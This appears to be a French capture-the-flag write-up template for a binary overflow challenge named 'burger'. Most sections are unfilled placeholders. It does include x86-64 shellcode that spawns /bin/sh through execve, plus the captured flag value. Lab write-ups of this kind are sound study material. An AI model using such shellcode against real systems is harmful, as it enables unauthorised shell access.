---
title: "burger"
challenge: "Neal"
difficulty: "5"
platform: "amd64/remote"
date: "2025-10-29"
tags: [binary, overflow]
author: "Ryan Bouchou"
status: "achieved"
---

# Titre lisible

**Résumé (1-2 lignes)**
Résumé court...

---

## Contexte

- Source : Neal
- Environnement testé : Arch Linux, amd64, glibc <>
- Fichiers fournis : `main.c`, `8-prepa-01-burger`

---

## Objectif

Récupérer le flag en obtenant un shell.

---

## Outils

- gdb + gef
- pwntools
- objdump

---

## Analyse

### 1) Reconnaissance statique

- La capture du payload est conditionnée par la fonction suivante :

```c

```

### 2) Analyse dynamique

- On remarque entre autres que `rax`, `rbx` et `rdx` sont nuls après l'instruction `ret`

### 3) Exploit

```asm
global _start
section .text
_start:
  ; On simule piece2
  mov rdi, "//bin/sh"
  shr rdi, 8
  ; jump rel8
  xor rsi, rsi
  push rsi
  push rdi
  mov rdi, rsp
  mov al, 0x3b
  syscall
```

---

## Résultat

- Flag {02da1bb071fc47d6525fbcc218212329}

## Root cause

Explication courte du bug

## Mitigation

- corrections proposées

## Leçons apprises / next steps

- pistes d'amélioration

## Commandes & références

- readelf -a binary

## Artefacts

- exploit.py, build/
